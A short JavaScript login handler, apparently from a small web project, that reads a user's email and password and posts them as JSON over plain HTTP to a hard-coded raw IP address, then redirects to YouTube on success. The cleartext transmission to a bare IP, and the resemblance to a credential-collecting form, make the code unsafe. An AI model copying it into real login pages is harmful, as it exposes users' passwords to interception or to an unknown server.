document.getElementById('login-btn').addEventListener('click', async function (event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    const data = { email, password };

    await submitLogin(data);
});

async function submitLogin(data) {
    try {
        const response = await fetch('http://185.198.152.96:8000/check_login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        console.log('Ответ сервера:', result);

        if (response.ok) {
            alert('Вход выполнен успешно!');
            window.location.href = 'https://www.youtube.com'; 
        } else {
            alert(result.detail || 'Произошла ошибка');
        }

    } catch (error) {
        console.error('Ошибка:', error);
        alert('Произошла ошибка при отправке данных');
    }
}
